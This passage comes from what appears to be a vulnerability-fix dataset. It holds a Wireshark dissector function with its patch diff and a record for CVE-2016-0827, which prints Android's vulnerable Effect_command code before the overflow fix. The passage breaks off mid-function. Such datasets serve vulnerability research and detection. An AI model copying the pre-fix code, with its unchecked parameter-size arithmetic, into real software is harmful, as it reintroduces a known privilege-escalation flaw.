{\n\t\t\tproto_item_append_text(ti, \" (%u bits)\",\n\t\t\t    cap_len * 8);\n\t\t}\n\t\tif (pinfo->phdr->presence_flags & WTAP_HAS_INTERFACE_ID) {\n\t\t\tproto_item_append_text(ti, \" on interface %u\",\n\t\t\t    pinfo->phdr->interface_id);\n\t\t}\n\t\tif (pinfo->phdr->presence_flags & WTAP_HAS_PACK_FLAGS) {\n\t\t\tif (pinfo->phdr->pack_flags & 0x00000001) {\n\t\t\t\tproto_item_append_text(ti, \" (inbound)\");\n\t\t\t\tpinfo->p2p_dir = P2P_DIR_RECV;\n\t\t\t}\n\t\t\tif (pinfo->phdr->pack_flags & 0x00000002) {\n\t\t\t\tproto_item_append_text(ti, \" (outbound)\");\n\t\t\t\tpinfo->p2p_dir = P2P_DIR_SENT;\n\t\t\t}\n\t\t}\n\n\t\tfh_tree = proto_item_add_subtree(ti, ett_frame);\n\n\t\tif (pinfo->phdr->presence_flags & WTAP_HAS_INTERFACE_ID && proto_field_is_referenced(tree, hf_frame_interface_id)) {\n\t\t\tconst char *interface_name = epan_get_interface_name(pinfo->epan, pinfo->phdr->interface_id);\n\n\t\t\tif (interface_name)\n\t\t\t\tproto_tree_add_uint_format_value(fh_tree, hf_frame_interface_id, tvb, 0, 0, pinfo->phdr->interface_id, \"%u (%s)\", pinfo->phdr->interface_id, interface_name);\n\t\t\telse\n\t\t\t\tproto_tree_add_uint(fh_tree, hf_frame_interface_id, tvb, 0, 0, pinfo->phdr->interface_id);\n\t\t}\n\n\t\tif (pinfo->phdr->presence_flags & WTAP_HAS_PACK_FLAGS) {\n\t\t\tproto_tree *flags_tree;\n\t\t\tproto_item *flags_item;\n\n\t\t\tflags_item = proto_tree_add_uint(fh_tree, hf_frame_pack_flags, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tflags_tree = proto_item_add_subtree(flags_item, ett_flags);\n\t\t\tproto_tree_add_uint(flags_tree, hf_frame_pack_direction, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_uint(flags_tree, hf_frame_pack_reception_type, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_uint(flags_tree, hf_frame_pack_fcs_length, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_uint(flags_tree, hf_frame_pack_reserved, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_crc_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_wrong_packet_too_long_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_wrong_packet_too_short_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_wrong_inter_frame_gap_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_unaligned_frame_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_start_frame_delimiter_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_preamble_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t\tproto_tree_add_boolean(flags_tree, hf_frame_pack_symbol_error, tvb, 0, 0, pinfo->phdr->pack_flags);\n\t\t}\n\n\t\tproto_tree_add_int(fh_tree, hf_frame_wtap_encap, tvb, 0, 0, pinfo->fd->lnk_t);\n\n\t\tif (pinfo->fd->flags.has_ts) {\n\t\t\tproto_tree_add_time(fh_tree, hf_frame_arrival_time, tvb,\n\t\t\t\t\t    0, 0, &(pinfo->fd->abs_ts));\n\t\t\tif(pinfo->fd->abs_ts.nsecs < 0 || pinfo->fd->abs_ts.nsecs >= 1000000000) {\n\t\t\t\texpert_add_info_format(pinfo, ti, &ei_arrive_time_out_of_range,\n\t\t\t\t\t\t\t\t  \"Arrival Time: Fractional second %09ld is invalid,\"\n\t\t\t\t\t\t\t\t  \" the valid range is 0-1000000000\",\n\t\t\t\t\t\t\t\t  (long) pinfo->fd->abs_ts.nsecs);\n\t\t\t}\n\t\t\titem = proto_tree_add_time(fh_tree, hf_frame_shift_offset, tvb,\n\t\t\t\t\t    0, 0, &(pinfo->fd->shift_offset));\n\t\t\tPROTO_ITEM_SET_GENERATED(item);\n\n\t\t\tif(generate_epoch_time) {\n\t\t\t\tproto_tree_add_time(fh_tree, hf_frame_arrival_time_epoch, tvb,\n\t\t\t\t\t\t    0, 0, &(pinfo->fd->abs_ts));\n\t\t\t}\n\n\t\t\tif (proto_field_is_referenced(tree, hf_frame_time_delta)) {\n\t\t\t\tnstime_t     del_cap_ts;\n\n\t\t\t\tframe_delta_abs_time(pinfo->epan, pinfo->fd, pinfo->fd->num - 1, &del_cap_ts);\n\n\t\t\t\titem = proto_tree_add_time(fh_tree, hf_frame_time_delta, tvb,\n\t\t\t\t\t\t\t   0, 0, &(del_cap_ts));\n\t\t\t\tPROTO_ITEM_SET_GENERATED(item);\n\t\t\t}\n\n\t\t\tif (proto_field_is_referenced(tree, hf_frame_time_delta_displayed)) {\n\t\t\t\tnstime_t del_dis_ts;\n\n\t\t\t\tframe_delta_abs_time(pinfo->epan, pinfo->fd, pinfo->fd->prev_dis_num, &del_dis_ts);\n\n\t\t\t\titem = proto_tree_add_time(fh_tree, hf_frame_time_delta_displayed, tvb,\n\t\t\t\t\t\t\t   0, 0, &(del_dis_ts));\n\t\t\t\tPROTO_ITEM_SET_GENERATED(item);\n\t\t\t}\n\n\t\t\titem = proto_tree_add_time(fh_tree, hf_frame_time_relative, tvb,\n\t\t\t\t\t\t   0, 0, &(pinfo->rel_ts));\n\t\t\tPROTO_ITEM_SET_GENERATED(item);\n\n\t\t\tif(pinfo->fd->flags.ref_time){\n\t\t\t\tti = proto_tree_add_item(fh_tree, hf_frame_time_reference, tvb, 0, 0, ENC_NA);\n\t\t\t\tPROTO_ITEM_SET_GENERATED(ti);\n\t\t\t}\n\t\t}\n\n\t\tproto_tree_add_uint(fh_tree, hf_frame_number, tvb,\n\t\t\t\t    0, 0, pinfo->fd->num);\n\n\t\tproto_tree_add_uint_format(fh_tree, hf_frame_len, tvb,\n\t\t\t\t\t   0, 0, frame_len, \"Frame Length: %u byte%s (%u bits)\",\n\t\t\t\t\t   frame_len, frame_plurality, frame_len * 8);\n\n\t\tproto_tree_add_uint_format(fh_tree, hf_frame_capture_len, tvb,\n\t\t\t\t\t   0, 0, cap_len, \"Capture Length: %u byte%s (%u bits)\",\n\t\t\t\t\t   cap_len, cap_plurality, cap_len * 8);\n\n\t\tif (generate_md5_hash) {\n\t\t\tconst guint8 *cp;\n\t\t\tmd5_state_t   md_ctx;\n\t\t\tmd5_byte_t    digest[16];\n\t\t\tconst gchar  *digest_string;\n\n\t\t\tcp = tvb_get_ptr(tvb, 0, cap_len);\n\n\t\t\tmd5_init(&md_ctx);\n\t\t\tmd5_append(&md_ctx, cp, cap_len);\n\t\t\tmd5_finish(&md_ctx, digest);\n\n\t\t\tdigest_string = bytestring_to_str(wmem_packet_scope(), digest, 16, '\\0');\n\t\t\tti = proto_tree_add_string(fh_tree, hf_frame_md5_hash, tvb, 0, 0, digest_string);\n\t\t\tPROTO_ITEM_SET_GENERATED(ti);\n\t\t}\n\n\t\tti = proto_tree_add_boolean(fh_tree, hf_frame_marked, tvb, 0, 0,pinfo->fd->flags.marked);\n\t\tPROTO_ITEM_SET_GENERATED(ti);\n\n\t\tti = proto_tree_add_boolean(fh_tree, hf_frame_ignored, tvb, 0, 0,pinfo->fd->flags.ignored);\n\t\tPROTO_ITEM_SET_GENERATED(ti);\n\n\t\tif(proto_field_is_referenced(tree, hf_frame_protocols)) {\n\t\t\t/* we are going to be using proto_item_append_string() on\n\t\t\t * hf_frame_protocols, and we must therefore disable the\n\t\t\t * TRY_TO_FAKE_THIS_ITEM() optimisation for the tree by\n\t\t\t * setting it as visible.\n\t\t\t *\n\t\t\t * See proto.h for details.\n\t\t\t */\n\t\t\told_visible = proto_tree_set_visible(fh_tree, TRUE);\n\t\t\tti = proto_tree_add_string(fh_tree, hf_frame_protocols, tvb, 0, 0, \"\");\n\t\t\tPROTO_ITEM_SET_GENERATED(ti);\n\t\t\tproto_tree_set_visible(fh_tree, old_visible);\n\t\t}\n\n\t\tif(pinfo->fd->pfd != 0){\n\t\t\tproto_item *ppd_item;\n\t\t\tguint num_entries = g_slist_length(pinfo->fd->pfd);\n\t\t\tguint i;\n\t\t\tppd_item = proto_tree_add_uint(fh_tree, hf_frame_num_p_prot_data, tvb, 0, 0, num_entries);\n\t\t\tPROTO_ITEM_SET_GENERATED(ppd_item);\n\t\t\tfor(i=0; i<num_entries; i++){\n\t\t\t\tproto_tree_add_text (fh_tree, tvb, 0, 0, \"%s\",p_get_proto_name_and_key(wmem_file_scope(), pinfo, i));\n\t\t\t}\n\t\t}\n\t\t/* Check for existences of P2P pseudo header */\n\t\tif (pinfo->p2p_dir != P2P_DIR_UNKNOWN) {\n\t\t\tproto_tree_add_int(fh_tree, hf_frame_p2p_dir, tvb,\n\t\t\t\t\t   0, 0, pinfo->p2p_dir);\n\t\t}\n\n\t\t/* Check for existences of MTP2 link number */\n\t\tif ((pinfo->pseudo_header != NULL ) && (pinfo->fd->lnk_t == WTAP_ENCAP_MTP2_WITH_PHDR)) {\n\t\t\tproto_tree_add_uint(fh_tree, hf_link_number, tvb,\n\t\t\t\t\t    0, 0, pinfo->link_number);\n\t\t}\n\n\t\tif (show_file_off) {\n\t\t\tproto_tree_add_int64_format_value(fh_tree, hf_frame_file_off, tvb,\n\t\t\t\t\t\t    0, 0, pinfo->fd->file_off,\n\t\t\t\t\t\t    \"%\" G_GINT64_MODIFIER \"d (0x%\" G_GINT64_MODIFIER \"x)\",\n\t\t\t\t\t\t    pinfo->fd->file_off, pinfo->fd->file_off);\n\t\t}\n\n\t\tif(pinfo->fd->color_filter != NULL) {\n\t\t\tconst color_filter_t *color_filter = (const color_filter_t *)pinfo->fd->color_filter;\n\t\t\titem = proto_tree_add_string(fh_tree, hf_frame_color_filter_name, tvb,\n\t\t\t\t\t\t     0, 0, color_filter->filter_name);\n\t\t\tPROTO_ITEM_SET_GENERATED(item);\n\t\t\titem = proto_tree_add_string(fh_tree, hf_frame_color_filter_text, tvb,\n\t\t\t\t\t\t     0, 0, color_filter->filter_text);\n\t\t\tPROTO_ITEM_SET_GENERATED(item);\n\t\t}\n\t}\n\n\tif (pinfo->fd->flags.ignored) {\n\t\t/* Ignored package, stop handling here */\n\t\tcol_set_str(pinfo->cinfo, COL_INFO, \"<Ignored>\");\n\t\tproto_tree_add_text (tree, tvb, 0, 0, \"This frame is marked as ignored\");\n\t\treturn;\n\t}\n\n\t/* Portable Exception Handling to trap Wireshark specific exceptions like BoundsError exceptions */\n\tTRY {\n#ifdef _MSC_VER\n\t\t/* Win32: Visual-C Structured Exception Handling (SEH) to trap hardware exceptions\n\t\t   like memory access violations.\n\t\t   (a running debugger will be called before the except part below) */\n                /* Note: A Windows \"exceptional exception\" may leave the kazlib's (Portable Exception Handling)\n                   stack in an inconsistent state thus causing a crash at some point in the\n                   handling of the exception.\n                   See: https://www.wireshark.org/lists/wireshark-dev/200704/msg00243.html\n                */\n\t\t__try {\n#endif\n\t\t\tif ((force_docsis_encap) && (docsis_handle)) {\n\t\t\t\tcall_dissector(docsis_handle, tvb, pinfo, parent_tree);\n\t\t\t} else {\n\t\t\t\tif (!dissector_try_uint(wtap_encap_dissector_table, pinfo->fd->lnk_t,\n\t\t\t\t\t\t\ttvb, pinfo, parent_tree)) {\n\n\t\t\t\t\tcol_set_str(pinfo->cinfo, COL_PROTOCOL, \"UNKNOWN\");\n\t\t\t\t\tcol_add_fstr(pinfo->cinfo, COL_INFO, \"WTAP_ENCAP = %d\",\n\t\t\t\t\t\t     pinfo->fd->lnk_t);\n\t\t\t\t\tcall_dissector(data_handle,tvb, pinfo, parent_tree);\n\t\t\t\t}\n\t\t\t}\n#ifdef _MSC_VER\n\t\t} __except(EXCEPTION_EXECUTE_HANDLER /* handle all exceptions */) {\n\t\t\tswitch(GetExceptionCode()) {\n\t\t\tcase(STATUS_ACCESS_VIOLATION):\n\t\t\t\tshow_exception(tvb, pinfo, parent_tree, DissectorError,\n\t\t\t\t\t       \"STATUS_ACCESS_VIOLATION: dissector accessed an invalid memory address\");\n\t\t\t\tbreak;\n\t\t\tcase(STATUS_INTEGER_DIVIDE_BY_ZERO):\n\t\t\t\tshow_exception(tvb, pinfo, parent_tree, DissectorError,\n\t\t\t\t\t       \"STATUS_INTEGER_DIVIDE_BY_ZERO: dissector tried an integer division by zero\");\n\t\t\t\tbreak;\n\t\t\tcase(STATUS_STACK_OVERFLOW):\n\t\t\t\tshow_exception(tvb, pinfo, parent_tree, DissectorError,\n\t\t\t\t\t       \"STATUS_STACK_OVERFLOW: dissector overflowed the stack (e.g. endless loop)\");\n\t\t\t\t/* XXX - this will have probably corrupted the stack,\n\t\t\t\t   which makes problems later in the exception code */\n\t\t\t\tbreak;\n\t\t\t\t/* XXX - add other hardware exception codes as required */\n\t\t\tdefault:\n\t\t\t\tshow_exception(tvb, pinfo, parent_tree, DissectorError,\n\t\t\t\t\t       g_strdup_printf(\"dissector caused an unknown exception: 0x%x\", GetExceptionCode()));\n\t\t\t}\n\t\t}\n#endif\n\t}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -65,9 +65,9 @@\n \t}\n \n \tif(pinfo->pkt_comment){\n-\t\titem = proto_tree_add_item(tree, proto_pkt_comment, tvb, 0, -1, ENC_NA);\n+\t\titem = proto_tree_add_item(tree, proto_pkt_comment, tvb, 0, 0, ENC_NA);\n \t\tcomments_tree = proto_item_add_subtree(item, ett_comments);\n-\t\tcomment_item = proto_tree_add_string_format(comments_tree, hf_comments_text, tvb, 0, -1,\n+\t\tcomment_item = proto_tree_add_string_format(comments_tree, hf_comments_text, tvb, 0, 0,\n \t\t\t\t\t\t\t                   pinfo->pkt_comment, \"%s\",\n \t\t\t\t\t\t\t                   pinfo->pkt_comment);\n \t\texpert_add_info_format(pinfo, comment_item, &ei_comments_text,\n@@ -95,7 +95,7 @@\n \t\tcap_plurality = plurality(cap_len, \"\", \"s\");\n \t\tframe_plurality = plurality(frame_len, \"\", \"s\");\n \n-\t\tti = proto_tree_add_protocol_format(tree, proto_frame, tvb, 0, -1,\n+\t\tti = proto_tree_add_protocol_format(tree, proto_frame, tvb, 0, tvb_captured_length(tvb),\n \t\t    \"Frame %u: %u byte%s on wire\",\n \t\t    pinfo->fd->num, frame_len, frame_plurality);\n \t\tif (generate_bits_field)\n@@ -293,7 +293,7 @@\n \tif (pinfo->fd->flags.ignored) {\n \t\t/* Ignored package, stop handling here */\n \t\tcol_set_str(pinfo->cinfo, COL_INFO, \"<Ignored>\");\n-\t\tproto_tree_add_text (tree, tvb, 0, -1, \"This frame is marked as ignored\");\n+\t\tproto_tree_add_text (tree, tvb, 0, 0, \"This frame is marked as ignored\");\n \t\treturn;\n \t}\n ",
        "diff_line_info": {
            "deleted_lines": [
                "\t\titem = proto_tree_add_item(tree, proto_pkt_comment, tvb, 0, -1, ENC_NA);",
                "\t\tcomment_item = proto_tree_add_string_format(comments_tree, hf_comments_text, tvb, 0, -1,",
                "\t\tti = proto_tree_add_protocol_format(tree, proto_frame, tvb, 0, -1,",
                "\t\tproto_tree_add_text (tree, tvb, 0, -1, \"This frame is marked as ignored\");"
            ],
            "added_lines": [
                "\t\titem = proto_tree_add_item(tree, proto_pkt_comment, tvb, 0, 0, ENC_NA);",
                "\t\tcomment_item = proto_tree_add_string_format(comments_tree, hf_comments_text, tvb, 0, 0,",
                "\t\tti = proto_tree_add_protocol_format(tree, proto_frame, tvb, 0, tvb_captured_length(tvb),",
                "\t\tproto_tree_add_text (tree, tvb, 0, 0, \"This frame is marked as ignored\");"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-0827",
        "func_name": "android/Effect_command",
        "description": "Multiple integer overflows in libeffects in mediaserver in Android 4.x before 4.4.4, 5.x before 5.1.1 LMY49H, and 6.x before 2016-03-01 allow attackers to gain privileges via a crafted application, as demonstrated by obtaining Signature or SignatureOrSystem access, related to EffectBundle.cpp and EffectReverb.cpp, aka internal bug 26347509.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/9e29523b9537983b4c4b205ff868d0b3bca0383b",
        "commit_title": "fix possible overflow in effect wrappers.",
        "commit_text": " Add checks on parameter size field in effect command handlers to avoid overflow leading to invalid comparison with min allowed size for command and reply buffers.  Bug: 26347509. (cherry picked from commit ad1bd92a49d78df6bc6e75bee68c517c1326f3cf) ",
        "func_before": "int Effect_command(effect_handle_t  self,\n                              uint32_t            cmdCode,\n                              uint32_t            cmdSize,\n                              void                *pCmdData,\n                              uint32_t            *replySize,\n                              void                *pReplyData){\n    EffectContext * pContext = (EffectContext *) self;\n    int retsize;\n\n    //ALOGV(\"\\t\\nEffect_command start\");\n\n    if(pContext->EffectType == LVM_BASS_BOOST){\n        //ALOGV(\"\\tEffect_command setting command for LVM_BASS_BOOST\");\n    }\n    if(pContext->EffectType == LVM_VIRTUALIZER){\n        //ALOGV(\"\\tEffect_command setting command for LVM_VIRTUALIZER\");\n    }\n    if(pContext->EffectType == LVM_EQUALIZER){\n        //ALOGV(\"\\tEffect_command setting command for LVM_EQUALIZER\");\n    }\n    if(pContext->EffectType == LVM_VOLUME){\n        //ALOGV(\"\\tEffect_command setting command for LVM_VOLUME\");\n    }\n\n    if (pContext == NULL){\n        ALOGV(\"\\tLVM_ERROR : Effect_command ERROR pContext == NULL\");\n        return -EINVAL;\n    }\n\n    //ALOGV(\"\\tEffect_command INPUTS are: command %d cmdSize %d\",cmdCode, cmdSize);\n\n    // Incase we disable an effect, next time process is\n    // called the number of effect called could be greater\n    // pContext->pBundledContext->NumberEffectsCalled = 0;\n\n    //ALOGV(\"\\tEffect_command NumberEffectsCalled = %d, NumberEffectsEnabled = %d\",\n    //        pContext->pBundledContext->NumberEffectsCalled,\n    //        pContext->pBundledContext->NumberEffectsEnabled);\n\n    switch (cmdCode){\n        case EFFECT_CMD_INIT:\n            if (pReplyData == NULL || replySize == NULL || *replySize != sizeof(int)){\n                ALOGV(\"\\tLVM_ERROR, EFFECT_CMD_INIT: ERROR for effect type %d\",\n                        pContext->EffectType);\n                return -EINVAL;\n            }\n            *(int *) pReplyData = 0;\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_INIT start\");\n            if(pContext->EffectType == LVM_BASS_BOOST){\n                //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_INIT for LVM_BASS_BOOST\");\n                android::BassSetStrength(pContext, 0);\n            }\n            if(pContext->EffectType == LVM_VIRTUALIZER){\n                //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_INIT for LVM_VIRTUALIZER\");\n                android::VirtualizerSetStrength(pContext, 0);\n            }\n            if(pContext->EffectType == LVM_EQUALIZER){\n                //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_INIT for LVM_EQUALIZER\");\n                android::EqualizerSetPreset(pContext, 0);\n            }\n            if(pContext->EffectType == LVM_VOLUME){\n                //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_INIT for LVM_VOLUME\");\n                *(int *) pReplyData = android::VolumeSetVolumeLevel(pContext, 0);\n            }\n            break;\n\n        case EFFECT_CMD_SET_CONFIG:\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_SET_CONFIG start\");\n            if (pCmdData    == NULL || cmdSize     != sizeof(effect_config_t) ||\n                    pReplyData  == NULL || replySize == NULL || *replySize  != sizeof(int)) {\n                ALOGV(\"\\tLVM_ERROR : Effect_command cmdCode Case: \"\n                        \"EFFECT_CMD_SET_CONFIG: ERROR\");\n                return -EINVAL;\n            }\n            *(int *) pReplyData = android::Effect_setConfig(pContext, (effect_config_t *) pCmdData);\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_SET_CONFIG end\");\n            break;\n\n        case EFFECT_CMD_GET_CONFIG:\n            if (pReplyData == NULL || replySize == NULL || *replySize != sizeof(effect_config_t)) {\n                ALOGV(\"\\tLVM_ERROR : Effect_command cmdCode Case: \"\n                        \"EFFECT_CMD_GET_CONFIG: ERROR\");\n                return -EINVAL;\n            }\n\n            android::Effect_getConfig(pContext, (effect_config_t *)pReplyData);\n            break;\n\n        case EFFECT_CMD_RESET:\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_RESET start\");\n            android::Effect_setConfig(pContext, &pContext->config);\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_RESET end\");\n            break;\n\n        case EFFECT_CMD_GET_PARAM:{\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_GET_PARAM start\");\n\n            effect_param_t *p = (effect_param_t *)pCmdData;\n\n            if (pCmdData == NULL || cmdSize < sizeof(effect_param_t) ||\n                    cmdSize < (sizeof(effect_param_t) + p->psize) ||\n                    pReplyData == NULL || replySize == NULL ||\n                    *replySize < (sizeof(effect_param_t) + p->psize)) {\n                ALOGV(\"\\tLVM_ERROR : EFFECT_CMD_GET_PARAM: ERROR\");\n                return -EINVAL;\n            }\n\n            memcpy(pReplyData, pCmdData, sizeof(effect_param_t) + p->psize);\n\n            p = (effect_param_t *)pReplyData;\n\n            int voffset = ((p->psize - 1) / sizeof(int32_t) + 1) * sizeof(int32_t);\n\n            if(pContext->EffectType == LVM_BASS_BOOST){\n                p->status = android::BassBoost_getParameter(pContext,\n                                                            p->data,\n                                                            (size_t  *)&p->vsize,\n                                                            p->data + voffset);\n                //ALOGV(\"\\tBassBoost_command EFFECT_CMD_GET_PARAM \"\n                //        \"*pCmdData %d, *replySize %d, *pReplyData %d \",\n                //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n                //        *replySize,\n                //        *(int16_t *)((char *)pReplyData + sizeof(effect_param_t) + voffset));\n            }\n\n            if(pContext->EffectType == LVM_VIRTUALIZER){\n                p->status = android::Virtualizer_getParameter(pContext,\n                                                             (void *)p->data,\n                                                             (size_t  *)&p->vsize,\n                                                              p->data + voffset);\n\n                //ALOGV(\"\\tVirtualizer_command EFFECT_CMD_GET_PARAM \"\n                //        \"*pCmdData %d, *replySize %d, *pReplyData %d \",\n                //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n                //        *replySize,\n                //        *(int16_t *)((char *)pReplyData + sizeof(effect_param_t) + voffset));\n            }\n            if(pContext->EffectType == LVM_EQUALIZER){\n                //ALOGV(\"\\tEqualizer_command cmdCode Case: \"\n                //        \"EFFECT_CMD_GET_PARAM start\");\n                p->status = android::Equalizer_getParameter(pContext,\n                                                            p->data,\n                                                            &p->vsize,\n                                                            p->data + voffset);\n\n                //ALOGV(\"\\tEqualizer_command EFFECT_CMD_GET_PARAM *pCmdData %d, *replySize %d, \"\n                //       \"*pReplyData %08x %08x\",\n                //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)), *replySize,\n                //        *(int32_t *)((char *)pReplyData + sizeof(effect_param_t) + voffset),\n                //        *(int32_t *)((char *)pReplyData + sizeof(effect_param_t) + voffset +\n                //        sizeof(int32_t)));\n            }\n            if(pContext->EffectType == LVM_VOLUME){\n                //ALOGV(\"\\tVolume_command cmdCode Case: EFFECT_CMD_GET_PARAM start\");\n                p->status = android::Volume_getParameter(pContext,\n                                                         (void *)p->data,\n                                                         (size_t  *)&p->vsize,\n                                                         p->data + voffset);\n\n                //ALOGV(\"\\tVolume_command EFFECT_CMD_GET_PARAM \"\n                //        \"*pCmdData %d, *replySize %d, *pReplyData %d \",\n                //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n                //        *replySize,\n                //        *(int16_t *)((char *)pReplyData + sizeof(effect_param_t) + voffset));\n            }\n            *replySize = sizeof(effect_param_t) + voffset + p->vsize;\n\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_GET_PARAM end\");\n        } break;\n        case EFFECT_CMD_SET_PARAM:{\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_SET_PARAM start\");\n            if(pContext->EffectType == LVM_BASS_BOOST){\n                //ALOGV(\"\\tBassBoost_command EFFECT_CMD_SET_PARAM param %d, *replySize %d, value %d\",\n                //       *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n                //       *replySize,\n                //       *(int16_t *)((char *)pCmdData + sizeof(effect_param_t) + sizeof(int32_t)));\n\n                if (pCmdData   == NULL ||\n                        cmdSize    != (sizeof(effect_param_t) + sizeof(int32_t) +sizeof(int16_t)) ||\n                        pReplyData == NULL || replySize == NULL || *replySize != sizeof(int32_t)) {\n                    ALOGV(\"\\tLVM_ERROR : BassBoost_command cmdCode Case: \"\n                            \"EFFECT_CMD_SET_PARAM: ERROR\");\n                    return -EINVAL;\n                }\n                effect_param_t *p = (effect_param_t *) pCmdData;\n\n                if (p->psize != sizeof(int32_t)){\n                    ALOGV(\"\\tLVM_ERROR : BassBoost_command cmdCode Case: \"\n                            \"EFFECT_CMD_SET_PARAM: ERROR, psize is not sizeof(int32_t)\");\n                    return -EINVAL;\n                }\n\n                //ALOGV(\"\\tnBassBoost_command cmdSize is %d\\n\"\n                //        \"\\tsizeof(effect_param_t) is  %d\\n\"\n                //        \"\\tp->psize is %d\\n\"\n                //        \"\\tp->vsize is %d\"\n                //        \"\\n\",\n                //        cmdSize, sizeof(effect_param_t), p->psize, p->vsize );\n\n                *(int *)pReplyData = android::BassBoost_setParameter(pContext,\n                                                                    (void *)p->data,\n                                                                    p->data + p->psize);\n            }\n            if(pContext->EffectType == LVM_VIRTUALIZER){\n              //ALOGV(\"\\tVirtualizer_command EFFECT_CMD_SET_PARAM param %d, *replySize %d, value %d\",\n              //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n              //        *replySize,\n              //        *(int16_t *)((char *)pCmdData + sizeof(effect_param_t) + sizeof(int32_t)));\n\n                if (pCmdData   == NULL ||\n                        // legal parameters are int16_t or int32_t\n                        cmdSize    > (sizeof(effect_param_t) + sizeof(int32_t) +sizeof(int32_t)) ||\n                        cmdSize    < (sizeof(effect_param_t) + sizeof(int32_t) +sizeof(int16_t)) ||\n                        pReplyData == NULL || replySize == NULL || *replySize != sizeof(int32_t)) {\n                    ALOGV(\"\\tLVM_ERROR : Virtualizer_command cmdCode Case: \"\n                            \"EFFECT_CMD_SET_PARAM: ERROR\");\n                    return -EINVAL;\n                }\n                effect_param_t *p = (effect_param_t *) pCmdData;\n\n                if (p->psize != sizeof(int32_t)){\n                    ALOGV(\"\\tLVM_ERROR : Virtualizer_command cmdCode Case: \"\n                            \"EFFECT_CMD_SET_PARAM: ERROR, psize is not sizeof(int32_t)\");\n                    return -EINVAL;\n                }\n\n                //ALOGV(\"\\tnVirtualizer_command cmdSize is %d\\n\"\n                //        \"\\tsizeof(effect_param_t) is  %d\\n\"\n                //        \"\\tp->psize is %d\\n\"\n                //        \"\\tp->vsize is %d\"\n                //        \"\\n\",\n                //        cmdSize, sizeof(effect_param_t), p->psize, p->vsize );\n\n                *(int *)pReplyData = android::Virtualizer_setParameter(pContext,\n                                                                      (void *)p->data,\n                                                                       p->data + p->psize);\n            }\n            if(pContext->EffectType == LVM_EQUALIZER){\n               //ALOGV(\"\\tEqualizer_command cmdCode Case: \"\n               //        \"EFFECT_CMD_SET_PARAM start\");\n               //ALOGV(\"\\tEqualizer_command EFFECT_CMD_SET_PARAM param %d, *replySize %d, value %d \",\n               //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n               //        *replySize,\n               //        *(int16_t *)((char *)pCmdData + sizeof(effect_param_t) + sizeof(int32_t)));\n\n                if (pCmdData == NULL || cmdSize < (sizeof(effect_param_t) + sizeof(int32_t)) ||\n                        pReplyData == NULL || replySize == NULL || *replySize != sizeof(int32_t)) {\n                    ALOGV(\"\\tLVM_ERROR : Equalizer_command cmdCode Case: \"\n                            \"EFFECT_CMD_SET_PARAM: ERROR\");\n                    return -EINVAL;\n                }\n                effect_param_t *p = (effect_param_t *) pCmdData;\n\n                *(int *)pReplyData = android::Equalizer_setParameter(pContext,\n                                                                    (void *)p->data,\n                                                                     p->data + p->psize);\n            }\n            if(pContext->EffectType == LVM_VOLUME){\n                //ALOGV(\"\\tVolume_command cmdCode Case: EFFECT_CMD_SET_PARAM start\");\n                //ALOGV(\"\\tVolume_command EFFECT_CMD_SET_PARAM param %d, *replySize %d, value %d \",\n                //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n                //        *replySize,\n                //        *(int16_t *)((char *)pCmdData + sizeof(effect_param_t) +sizeof(int32_t)));\n\n                if (pCmdData   == NULL ||\n                        cmdSize    < (sizeof(effect_param_t) + sizeof(int32_t)) ||\n                        pReplyData == NULL || replySize == NULL ||\n                        *replySize != sizeof(int32_t)) {\n                    ALOGV(\"\\tLVM_ERROR : Volume_command cmdCode Case: \"\n                            \"EFFECT_CMD_SET_PARAM: ERROR\");\n                    return -EINVAL;\n                }\n                effect_param_t *p = (effect_param_t *) pCmdData;\n\n                *(int *)pReplyData = android::Volume_setParameter(pContext,\n                                                                 (void *)p->data,\n                                                                 p->data + p->psize);\n            }\n            //ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_SET_PARAM end\");\n        } break;\n\n        case EFFECT_CMD_ENABLE:\n            ALOGV(\"\\tEffect_command cmdCode Case: EFFECT_CMD_ENABLE start\");\n            if (pReplyData == NULL || replySize == NULL || *replySize != 